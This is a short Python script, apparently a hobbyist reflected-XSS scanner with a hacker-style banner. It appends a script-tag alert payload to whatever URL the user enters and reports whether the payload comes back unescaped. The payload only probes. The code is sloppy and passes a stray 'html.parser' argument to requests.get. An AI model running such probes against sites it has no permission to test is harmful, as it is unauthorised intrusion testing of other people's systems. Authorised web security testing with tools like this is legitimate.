import requests
import threading
from colorama import Fore, Back, Style


print(
        Fore.GREEN +
         """
 *******          *******           **      ** ** **      
/**////**        /**////**         /**     /**// /**      
/**    /** ******/**    /**  ***** /**     /** **/**      
/**    /**////** /**    /** **///**//**    ** /**/**      
/**    /**   **  /**    /**/******* //**  **  /**/**      
/**    **   **   /**    ** /**////   //****   /**/**      
/*******   ******/*******  //******   //**    /**/********
///////   ////// ///////    //////     //     // //////// 
                                          [ twitter.com/devilcombo ]
        """ + Fore.RESET)

url = input("Please Enter Target Url = ")
payload = "<script>alert(123);</script>"
req=requests.get(url+payload,"html.parser").text;
print(url+payload)
if payload in req:
    print(Fore.GREEN +'XSS Found   -->','   ' , f"{url+payload}" + Fore.RESET)
else:
    print(Fore.RED + 'XSS Not Found' + Fore.RESET)
